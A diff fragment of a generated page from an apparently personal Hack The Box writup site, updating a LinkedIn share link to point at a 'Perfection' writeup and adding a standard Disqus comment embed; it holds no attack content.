-    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Codify.html&text=Writeup+for+HTB Codify Writeup+from+HTB+held+on+2024-04-05 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Perfection.html&text=Writeup+for+HTB Perfection writeup+from+HTB+held+on+2024-07-06 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
       class="fa fa-linkedin" aria-hidden="true"></i></a>
 </div>
     </section>
@@ -755,6 +717,24 @@ e5****************************31
 
   <div id="comments" class="container">
     <section id="disqus_container">
+      
+      <hr>
+      <div id="disqus_thread"></div>
+<script>
+    function disqus_config() {
+        this.callbacks.onReady.push(function() {
+            setSizes();
+        });
+    }
+    (function () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
       
     </section>
   </div>
